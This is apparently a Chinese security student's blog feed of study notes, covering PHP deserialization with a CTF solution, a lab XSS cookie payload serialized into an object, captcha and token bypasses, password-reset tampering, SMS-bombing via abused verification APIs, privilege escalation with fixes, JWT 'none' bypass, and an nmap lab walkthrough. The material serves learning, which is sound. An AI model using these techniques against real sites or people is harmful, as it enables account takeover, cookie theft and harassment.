<p>运行结果:<br><img src="https://pic.imgdb.cn/item/6537d139c458853aef7436b2.jpg" alt="图二" title="无类反序列化结果"><br>还原成原本的字符串。<br>(1)、无类情况下较为简单,就是简单的转化。<br>(2)、以上两个实例可以简单区分序列化(将对象转为字符串)与反序列化(将字符串还原成对象)。</p>
<h3 id="有类情况"><a href="#有类情况" class="headerlink" title="有类情况"></a>有类情况</h3><p>前言:有类情况下较上述情况复杂,因为有类的话会在程序执行的特定时间点,会自动调用魔术方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">ABC</span></span>&#123; <span class="comment">//定义了一个类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; <span class="comment">//在创建对象(new)时自动调用</span></span><br><span class="line">        <span class="variable">$test</span> = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;调用了构造函数&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; <span class="comment">//在执行serialize()和程序彻底结束的时候调用</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;调用了析构函数&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; <span class="comment">//调用unserialize()自动调用</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;调用了苏醒函数&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;创建对象a&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ABC;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;序列化&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$a_ser</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;反序列化&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$a_unser</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$a_ser</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;对象快要被销毁了！&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行结果:<br><img src="https://pic.imgdb.cn/item/6537d145c458853aef746dfb.jpg" alt="图三" title="有类执行结果"><br>这里调用析构函数时并不是在调用serialize()后立刻执行,而是在所有语句执行完后在执行。如果序列化那段代码放到反序列化那段代码后,即:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ABC;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;反序列化&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$a_unser</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$a_ser</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;对象快要被销毁了！&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;序列化&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$a_ser</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>那么就会只执行一次(因为本身就在最后)。</p>
<h2 id="ctf真题bugku"><a href="#ctf真题bugku" class="headerlink" title="ctf真题bugku"></a>ctf真题bugku</h2><p>题目:点login咋没反应<br>开启环境后,进来发现只有一个平平无奇的登录框。<br><img src="https://pic.imgdb.cn/item/6537d158c458853aef74bb6a.jpg" alt="图四" title="平平无奇"><br>查看源码,发现有一个css文件可以访问<br><img src="https://pic.imgdb.cn/item/6537d163c458853aef74ebdd.jpg" alt="图五" title="发现一个可以访问的文件"><br>访问后,发现就是一个普通的css样式,我刚开始看的时候还是没有发现什么问题,但是,细看上面有一个?4495,这是什么呢?<br><img src="https://pic.imgdb.cn/item/6537d16fc458853aef751cb3.jpg" alt="图六" title="?4495"><br>突然想起和网址栏上的属性与属性值,好像可以把这串东西填入,填入哪里呢?不久两个地方可以填吗,一个是这个css文件,另一个就是刚才的源码网址。<br>先试一下源码网址填入&#x2F;?4495<br><a href="http://114.67.175.224:13957/?4495">http://114.67.175.224:13957/?4495</a><br>发现跳转到一个界面。<br><img src="https://pic.imgdb.cn/item/6537d17bc458853aef754dd5.jpg" alt="图七" title="注意|关键点"><br>关键来了,这里有几个注意点:<br>1、$KEY值给出,那么下面必然会用到。<br>2、flag.php被包含了进来,那么猜测flag可能存在于这个文件,我该思考如何把里面的内容读出。<br>3、以cookie方式传输值,且属性是”BUGKU”(cookie传值时,写成BUGKU&#x3D;****)。<br>4、如果get请求包含4495,那么就会自动跳回此原来界面,而不会执行else if的语句打印flag。<br>5、else if内存在一个反序列化的函数,那么思路就是编程把$KEY的值序列化,然后通过cookie传输则可获取flag。<br>按照如上思路,先获取序列化的$KEY</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$key</span>=<span class="string">&#x27;ctf.bugku.com&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$key</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>抓包,添加cookie,且get请求内的4495要去掉<br><img src="https://pic.imgdb.cn/item/6537d180c458853aef7562b8.jpg" alt="图八" title="抓包|获取flag"><br>把获取到的flag提交即可。</p>
<h2 id="有类情况下的靶场练习-pikachu"><a href="#有类情况下的靶场练习-pikachu" class="headerlink" title="有类情况下的靶场练习(pikachu)"></a>有类情况下的靶场练习(pikachu)</h2><p>上面两道题都是无类情况,该情况构造序列化payload的代码相对简单,接下来是学习有类情况下如何构造payload。<br>由于是本地靶场,那么我可以先查看源码。<br><img src="https://pic.imgdb.cn/item/6538773ec458853aefe880ac.jpg" alt="图九" title="代码审计"><br>发现存在一个class类,而且存在一个创建对象会触发的魔术方法,那么可以考虑利用,但是发现就算利用的上也没啥大用,总不能改别人代码吧。此路不通,那么往下看,发现一个判断,意思是如果是接收的是序列化的值,那么会转为对象并赋值给unser;如果不是序列化的值,没用。<br>而且,它的打印输出语句不是echo,那么就要考虑写js语句(觉得应该是如果简单输出字符串,那么就对获取信息没啥用,所以考虑可获取cookie的js语句)。<br>构造payload(编程,目的是把payload序列化):</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123; <span class="comment">//创建一个类</span></span><br><span class="line">   <span class="keyword">var</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;<span class="comment">//赋初值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$whoami</span>=<span class="keyword">new</span> <span class="title function_ invoke__">S</span>();<span class="comment">//创建一个对象</span></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span>;<span class="comment">//构造payload,获取cookie</span></span><br><span class="line"><span class="variable">$whoami</span>-&gt;test=<span class="variable">$payload</span>;<span class="comment">//传输payload</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$whoami</span>);<span class="comment">//输出序列化的内容</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>关于上述代码的注意点:<br>如果对方有类,那么你构造的代码必须也含有类(类名也要相同),然后创建一个对象传输你要传输的数据(我称之为一一对应)。<br>运行后,获取到序列化的payload:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65387749c458853aefe8a472.jpg" alt="图十" title="代码构造payload"><br>把这句payload放入文本框,并submit，成功弹出cookie信息。<br><img src="https://pic.imgdb.cn/item/65387753c458853aefe8caac.jpg" alt="图十一" title="成功弹出cookie"></p>
]]></content>
      <categories>
        <category>Recorder</category>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>验证安全|验证码|接口|token</title>
    <url>/2023/10/20/jieko/</url>
    <content><![CDATA[<h2 id="大纲-思维导图"><a href="#大纲-思维导图" class="headerlink" title="大纲|思维导图"></a>大纲|思维导图</h2><p>图片来源于网络<br><img src="https://pic.imgdb.cn/item/6532210ac458853aef24038e.png" alt="图一" title="验证安全"><br><img src="https://pic.imgdb.cn/item/65322118c458853aef242da7.png" alt="图二" title="逻辑漏洞"><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=35&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">讲解整体知识点,简要概况:1:00</a></p>
<h2 id="验证码安全"><a href="#验证码安全" class="headerlink" title="验证码安全"></a>验证码安全</h2><p>● 分类: 图片，手机或邮箱，语音，视频，操作等<br>● 原理: 验证生成或验证过程中的逻辑问题<br>● 危害: 账户权限泄漏，短信轰炸，遍历，任意用户操作等<br>● 漏洞: 客户端回显(已讲)，验证码复用，验证码爆破(已讲)，绕过等<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=35&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">验证码识别插件及工具操作演示-实例:8:50</a><br>Pkav_Http_Fuzz:一个带图形验证码爆破识别的渗透测试工具。<br><a href="https://www.cnblogs.com/guojia000/p/14180685.html">https://www.cnblogs.com/guojia000/p/14180685.html</a><br>推荐:两款插件–软件不可以借助burpsuite实现爆破,插件可以。<br>captcha-killer:<br><a href="https://blog.csdn.net/doulicau/article/details/122981624">https://blog.csdn.net/doulicau/article/details/122981624</a><br><a href="https://www.cnblogs.com/cwkiller/p/12659549.html">https://www.cnblogs.com/cwkiller/p/12659549.html</a><br>reCAPTCHA:<br><a href="https://github.com/bit4woo/reCAPTCHA/releases/tag/v1.0">https://github.com/bit4woo/reCAPTCHA/releases/tag/v1.0</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=35&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">验证码绕过本地及远程验证-本地及实例:28:00</a><br>1、远程(服务器)验证:pikachu靶场–onclientbao爆破,第一步先试一下正确的验证码,抓包,发现验证码对提示账号密码错误;第二次故意输入另一个账号,观察这个验证码有无失效,发现没有失效,那么这里就存在一个验证码复用的问题。为什么会出现这个逻辑漏洞,是因为对方的服务器上的验证验证码的代码存在逻辑漏洞(没有及时销毁session):在第一次验证时,若验证码正确,那么就会产生一个session保存这个结果,如果一次验证完后没有销毁,那么就会产生这个问题。<br>2、本地验证一般是前端(js)。<br>3、如何判断前&#x2F;后端验证?<br>右键-查看元素,如果在前端看到验证代码，那就是前端验证;反之是后端验证。<br>4、可以调用别的网站上的多个接口,通过验证码绕过,实现往别人手机号重复发送多次短信验证码,实现短信轰炸。</p>
<h2 id="token安全"><a href="#token安全" class="headerlink" title="token安全"></a>token安全</h2><p>● 基本上述同理，主要是验证中可存在绕过可继续后续测试<br>● token 爆破，token 客户端回显等<br>token在前面主要是防止CSRF的。<br>关于token的详解:<a href="https://blog.csdn.net/zheng_qq/article/details/120375798">https://blog.csdn.net/zheng_qq/article/details/120375798</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=35&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">Token客户端回显绕过登录爆破演示–本地:57:00</a><br>1、关于token的爆破比较困难,因为token是在实时变化的,我们爆破时如果观察到下一个的token就包含在上一个数据包的回显中(token不是服务器产生的?),那这种情况就可以操作爆破,详情上网搜。否则爆破不了。<br>–原因是把token设置在了session文件中，并在前端输出token。</p>
<h2 id="接口安全问题"><a href="#接口安全问题" class="headerlink" title="接口安全问题"></a>接口安全问题</h2><p>● 调用，遍历，未授权，篡改等<br>● 调用案例：短信轰炸<br>● 遍历案列：UID 等遍历<br>● callback 回调 JSONP<br>● 参数篡改：墨者靶场<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=35&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">本地某URL下载接口ID值调用遍历测试-实例:1:14:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=35&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">Callback(回调)自定义返回调用安全-漏洞测试-实例:1:18:00</a><br>1、有点迷,好像是回调对面要取数据,我可以把js语句注入里面,那么可能存在跨站漏洞。<br>2、callback是对面接受返回值的一个接口(函数?),比如说支付成功,如何判断成功,那就是callback回调取支付成功的状态返回。</p>
<h2 id="总结-小技巧-拓展"><a href="#总结-小技巧-拓展" class="headerlink" title="总结|小技巧|拓展"></a>总结|小技巧|拓展</h2><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=35&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">上述在实战中如何做到漏洞发现-bp功能点(bp进阶):1:18:00</a><br>1、bp里面的spider–爬虫,可以帮助在大量的数据包寻找token、uid等值(参数)的指定数据包,辅助找到网站带有xx功能的页面,就是对数据包进行了筛选。–感觉像是对网站进行简单的扫描、发现漏洞。</p>
]]></content>
      <categories>
        <category>业务逻辑越权</category>
      </categories>
      <tags>
        <tag>业务逻辑越权</tag>
      </tags>
  </entry>
  <entry>
    <title>找回机制|接口安全</title>
    <url>/2023/10/19/jiekouanquan/</url>
    <content><![CDATA[<h2 id="找回重置机制"><a href="#找回重置机制" class="headerlink" title="找回重置机制"></a>找回重置机制</h2><p>客户端回显(浏览器、数据包可以看到)<br>Response 状态值(例如0改成1绕过)<br>验证码爆破<br>找回流程绕过(drop验证码的数据包)等<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=34&vd_source=d32bce54780cf3d9710df43274886fde">墨者靶场密码重置-验证码套用-靶场(找回流程绕过):8:30</a><br>1、就是先把一个正常用户的手机话输入验证码后,点击提交时抓包,把手机号改成目标的,主要是这个靶场输入手机验证码与改密码处于同一个界面,导致数据包中的数据可以被篡改。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=34&vd_source=d32bce54780cf3d9710df43274886fde">手机邮箱验证码逻辑-客户端回显-实例:18:20~45:00都是干货</a><br>1、看手机验证码那里有一点迷,就是先用自己手机号获取一个正确的验证码,然后输入另一个手机号,输入自己之前抓包截获的那个验证码,提交后抓包,把新的验证码填入指定位置即可。(之前获得那个验证码只是为了验证码回显到数据包,这样才可自己篡改验证码)–演示(42:00)。<br>2、输入错误的验证码以及正确的验证码时,对方会回一个数据包,从这个数据包可以看到验证码正确或者错误的状态码,我们可以把错误界面的状态码修改成正确界面的,从而实现绕过。但是这有一个前提,这个状态码的验证得是前端验证的才行,后端验证的话,改了也没用。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=34&vd_source=d32bce54780cf3d9710df43274886fde">绑定手机验证码逻辑-Rep 状态值篡改-实例–关于上一个知识点的真实网站测试:45:00(可以反复观摩)</a><br>1、通过这样操作只要知道别人的手机号,可以更改其密码了。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=34&vd_source=d32bce54780cf3d9710df43274886fde">找回密码验证码逻辑-爆破测试-实例:57:00</a><br>1、虽然简单粗暴,但限制很多。</p>
<h2 id="接口调用乱用"><a href="#接口调用乱用" class="headerlink" title="接口调用乱用"></a>接口调用乱用</h2><p>接口详解:<a href="https://www.elecfans.com/emb/jiekou/202304172059871.html">https://www.elecfans.com/emb/jiekou/202304172059871.html</a><br>短信轰炸，来电轰炸等<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=34&vd_source=d32bce54780cf3d9710df43274886fde">某 APP 短信轰炸接口乱用-实例接口调用发包:1:06:00</a><br>1、利用平台发送验证码的接口,把多个平台的此类接口集合起来,截获发送验证码的数据包,用程序循环轰炸指定手机号。</p>
]]></content>
      <categories>
        <category>业务逻辑越权</category>
      </categories>
      <tags>
        <tag>业务逻辑越权</tag>
      </tags>
  </entry>
  <entry>
    <title>水平垂直越权</title>
    <url>/2023/10/17/luojiyuequan/</url>
    <content><![CDATA[<h2 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h2><p><img src="https://pic.imgdb.cn/item/652e9c6bc458853aef0bd201.png" alt="图一" title="逻辑越权学习"><br>逻辑越权漏洞不像前面那些漏洞一样具有一定的系统影响（危害大）,只是一些代码层面上的逻辑漏洞。<br>此类漏洞不限于各种脚本，不与网站脚本以及搭建环境相关,是一类通用漏洞。</p>
<h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>1、越权分为水平越权以及垂直越权、还有未授权访问。<br><img src="https://pic.imgdb.cn/item/652e9f5bc458853aef1283f6.png" alt="图二" title="水平越权以及垂直越权"><br>2、基本概念:<br> 水平越权(危害较小–平级用户间的跨越):通过更换的某个 ID 之类的身份标识，从而使 A 账号获取（修改、删除等）B 账号数据。<br> 垂直越权(危害较大–权限的跨越):使用低权限身份的账号，发送高权限账号才能有的请求，获得其高权限的操作–但是实现前提比较苛刻（感觉与CSRF差不多,都要获取对应敏感操作的数据包,只不过垂直越权看重的是获取那个数据包的cookie）。<br> 未授权访问:通过删除请求中的认证信息后重放该请求，依旧可以访问或者完成操作–不需要用户(不需要登录)。<br> 3、漏洞成因:<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=32&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">本地pikachu靶场演示水平垂直漏洞成因(重要,因为不止讲了成因,还有一些思路):6:58</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=32&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">墨者水平-身份认证失效漏洞实战（漏洞成因）:27:28</a><br>(1)、burp suite的活学活用,不可拘泥于抓包。<br>4、漏洞原理<br>(1)、前端安全造成(前端代码逻辑问题),安全验证写在前端（判断用户等级之后，在用户的代码界面进行可选显示）–仅仅只是判断等级,不给予显示而已,但数据内容存在。<br>ps:但是如果前端在用户申请某一操作前进行安全验证,那这种是有效的,较为安全。<br>(2)、后端安全造成,数据库验证。一般按照组编号或用户类型编号判断当前用户属于什么级别。如果在访问数据包中有传输用户的编号、用户组编号或类型编号的时候，那么尝试对这个值进行修改，就是测试越权漏洞的基本操作。</p>
<h2 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h2><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=32&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">越权检测-小米范越权漏洞检测工具（工具使用）:1:04:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=32&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">越权检测-Burpsuite 插件 Authz 安装测试（插件使用）–推荐:1:09:00</a></p>
<h3 id="修复防御方案"><a href="#修复防御方案" class="headerlink" title="修复防御方案"></a>修复防御方案</h3><p>1.前后端同时对用户输入信息进行校验，双重验证机制<br>2.调用功能前验证用户是否有权限调用相关功能<br>3.执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限<br>4.直接对象引用的加密资源 ID，防止攻击者枚举 ID，敏感数据特殊化处理<br>5.永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤</p>
]]></content>
      <categories>
        <category>业务逻辑越权</category>
      </categories>
      <tags>
        <tag>业务逻辑越权</tag>
      </tags>
  </entry>
  <entry>
    <title>JWT</title>
    <url>/2023/11/21/jwt/</url>
    <content><![CDATA[<h2 id="JWT-大纲"><a href="#JWT-大纲" class="headerlink" title="JWT|大纲"></a>JWT|大纲</h2><p><img src="https://pic.imgdb.cn/item/655cc751c458853aefaa21e2.png" title="JAVA应用安全"><br><img src="https://pic.imgdb.cn/item/655cc789c458853aefab2c71.png" title="JWT"></p>
<h2 id="具体分析-笔记"><a href="#具体分析-笔记" class="headerlink" title="具体分析|笔记"></a>具体分析|笔记</h2><h3 id="JWT-定义"><a href="#JWT-定义" class="headerlink" title="JWT|定义"></a>JWT|定义</h3><p>JSON Web Token（JSON Web 令牌）是一种跨域（域名）验证身份的方案。JWT 不加密传输的数据，但能够通过数字签名来验证数据未被篡改。<br>JWT 分为三部分，头部（Header），声明（Claims），签名（Signature），三个部分以英文句号.隔开。 JWT 的内容以 Base64URL 进行了编码。<br>但是签名部分需要前面两部分的整合以及密钥才可解密。 </p>
<h3 id="JWT-例子"><a href="#JWT-例子" class="headerlink" title="JWT|例子"></a>JWT|例子</h3><figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">头部（<span class="symbol">Header</span>）</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;alg&quot;</span>:<span class="string">&quot;HS256&quot;</span>,</span><br><span class="line"><span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*alg</span></span><br><span class="line"><span class="comment">是说明这个JWT的签名使用的算法的参数，常见值用as256(默认)，s512等，也可以为None。Hs256表示HMAC SHA256。</span></span><br><span class="line"><span class="comment">typ</span></span><br><span class="line"><span class="comment">说明这个token的类型为JWT*/</span></span><br><span class="line">声明（<span class="symbol">Claims</span>）</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;exp&quot;</span>: <span class="number">1416471934</span>,</span><br><span class="line"><span class="string">&quot;user_name&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line"><span class="string">&quot;scope&quot;</span>: [</span><br><span class="line"><span class="string">&quot;read&quot;</span>,</span><br><span class="line"><span class="string">&quot;write&quot;</span></span><br><span class="line">],</span><br><span class="line"><span class="string">&quot;authorities&quot;</span>: [</span><br><span class="line"><span class="string">&quot;ROLE_ADMIN&quot;</span>,</span><br><span class="line"><span class="string">&quot;ROLE_USER&quot;</span></span><br><span class="line">],</span><br><span class="line"><span class="string">&quot;jti&quot;</span>: <span class="string">&quot;9bc92a44-0b1a-4c5e-be70-da52075b9a84&quot;</span>,</span><br><span class="line"><span class="string">&quot;client_id&quot;</span>: <span class="string">&quot;my-client-with-secret&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">声明（<span class="symbol">Claims</span>）</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;exp&quot;</span>: <span class="number">1416471934</span>,</span><br><span class="line"><span class="string">&quot;user_name&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line"><span class="string">&quot;scope&quot;</span>: [</span><br><span class="line"><span class="string">&quot;read&quot;</span>,</span><br><span class="line"><span class="string">&quot;write&quot;</span></span><br><span class="line">],</span><br><span class="line"><span class="string">&quot;authorities&quot;</span>: [</span><br><span class="line"><span class="string">&quot;ROLE_ADMIN&quot;</span>,</span><br><span class="line"><span class="string">&quot;ROLE_USER&quot;</span></span><br><span class="line">],</span><br><span class="line"><span class="string">&quot;jti&quot;</span>: <span class="string">&quot;9bc92a44-0b1a-4c5e-be70-da52075b9a84&quot;</span>,</span><br><span class="line"><span class="string">&quot;client_id&quot;</span>: <span class="string">&quot;my-client-with-secret&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="JWT-杂七杂八"><a href="#JWT-杂七杂八" class="headerlink" title="JWT|杂七杂八"></a>JWT|杂七杂八</h3><p>1、关于JWT的知识点<br><img src="https://pic.imgdb.cn/item/655d5ac7c458853aef017df6.jpg" title="JWT相关"><br>2、签名不对，那就只可更改头部内容为none。（前提：对方服务器无需验证签名）<br>3、JWT可能也会导致sql注入，原因是头部的kid值可能会带入数据库查询。<br><code>使用在线jwt解码</code><br><a href="https://jwt.io/">https://jwt.io/</a></p>
]]></content>
      <categories>
        <category>JWT</category>
      </categories>
      <tags>
        <tag>JWT</tag>
      </tags>
  </entry>
  <entry>
    <title>my_serve_file|Record</title>
    <url>/2023/11/04/my-serve-file/</url>
    <content><![CDATA[<h2 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h2><p>这里你需要学习的有几个前置知识点:<br><code>1、nmap的参数意义。</code><br>nmap的扫描参数是很重要的,可以略微学习一下。</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">常用几种(me)</span><br><span class="line"><span class="deletion">-sV：服务版本检测。</span></span><br><span class="line"><span class="deletion">-sP：Ping扫描，用于探测存活主机。</span></span><br><span class="line"><span class="deletion">-sS：TCP SYN扫描，快速扫描常用端口。</span></span><br></pre></td></tr></table></figure>
<p>学习链接:<br><a href="https://zhuanlan.zhihu.com/p/585377081">https://zhuanlan.zhihu.com/p/585377081</a><br><a href="https://blog.csdn.net/weixin_41489908/article/details/132202381">https://blog.csdn.net/weixin_41489908/article/details/132202381</a><br><code>2、请确认你的靶机情况:若你是自己开虚拟机自己打,请把两台虚拟机的网络设置改成:&quot;仅主机模式&quot;;若是一个团队一起学习:请改为桥接</code><br>简而言之就是仅主机模式就是虚拟机仅与真实机连接(不能联网，只能Ping通虚拟机);桥接是与这整个局域网(路由器)连接。<br>关于虚拟机的几种网络设置的学习链接:<a href="https://blog.csdn.net/Edward1027/article/details/124785835">https://blog.csdn.net/Edward1027/article/details/124785835</a><br><img src="https://pic.imgdb.cn/item/65464a24c458853aefb6a9d8.jpg"><br><code>你确定你掌握了吗,那就开始吧。</code></p>
<h2 id="扫描主机ip-判断靶机ip-探针开放端口"><a href="#扫描主机ip-判断靶机ip-探针开放端口" class="headerlink" title="扫描主机ip|判断靶机ip|探针开放端口"></a>扫描主机ip|判断靶机ip|探针开放端口</h2><p>开启靶机,看到一个登录界面(?)。<br><img src="https://pic.imgdb.cn/item/65464a13c458853aefb650a5.jpg"><br>这算是一个比较真实的实战环境,就是开局啥也不给,全靠自己找。那么我们就可以开启kali,一顿乱扫先。<br>这里我两种方法都试了一下,由于-sP参数是仅扫主机,-sS参数(端口)可以直接判断哪台主机是靶机ip(192.168.146.129)。<br>sP参数判断存活主机<br><img src="https://pic.imgdb.cn/item/65464aafc458853aefb98e45.jpg"><br>sS参数扫描每个主机上的端口服务<br><img src="https://pic.imgdb.cn/item/65464a37c458853aefb70d6a.jpg"><br>且已知开放端口:</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="number">21</span>/tcp   <span class="built_in">open</span>  <span class="keyword">ftp</span></span><br><span class="line"><span class="number">22</span>/tcp   <span class="built_in">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="built_in">open</span>  <span class="keyword">http</span></span><br><span class="line"><span class="number">111</span>/tcp  <span class="built_in">open</span>  rpcbind</span><br><span class="line"><span class="number">445</span>/tcp  <span class="built_in">open</span>  microsoft-ds</span><br><span class="line"><span class="number">2049</span>/tcp <span class="built_in">open</span>  nfs</span><br><span class="line"><span class="number">2121</span>/tcp <span class="built_in">open</span>  ccproxy-<span class="keyword">ftp</span></span><br></pre></td></tr></table></figure>
<h2 id="扫描靶机端口-判断每个端口下的服务"><a href="#扫描靶机端口-判断每个端口下的服务" class="headerlink" title="扫描靶机端口|判断每个端口下的服务"></a>扫描靶机端口|判断每个端口下的服务</h2><p>既然知道了靶机的ip,那么开始扫描端口。</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">扫描「指定端口」，使用 -p 参数，可以一次扫描单个端口、多个端口、或扫描一个范围的端口</span><br><span class="line">nmap <span class="number">192.168.31.180</span> -p <span class="number">80</span></span><br><span class="line">nmap <span class="number">192.168.31.180</span> -p <span class="number">80,3389,22</span>,<span class="number">21</span></span><br><span class="line">nmap <span class="number">192.168.31.180</span> -p <span class="number">1-65535</span></span><br></pre></td></tr></table></figure>
<p>这里其实用上面扫描主机时-sS参数即可,只是记录下思路。</p>
<h2 id="针对每个端口开始测试"><a href="#针对每个端口开始测试" class="headerlink" title="针对每个端口开始测试"></a>针对每个端口开始测试</h2><p>温馨ps:针对上面两个操作,nmap -sS -sV -A -n -p- ip(一步到位)<br>进入正题。</p>
<h3 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h3><p>首先,经过端口扫描后发现开启了7个端口，分别是：21 22 80 111 445 2049 2121 开启了这些服务http，ftp，smb，ssh。先访问一下80端口得网页看看。<br>这里有个小插曲:我竟然进不去!(小闹剧,靶机不用时还是关机的好qwq)<br>引出一个习惯:扫描后一定要先ping一下看ping不ping得通。<br>好了,再次进入正题,进入80端口。<br>发现是一个简易的小网页,没有什么特别的。<br><img src="https://pic.imgdb.cn/item/65464ac6c458853aefba0e45.jpg"><br>有一个超链接点一下只是重定向到一个毫不相干的网页,不予理睬。</p>
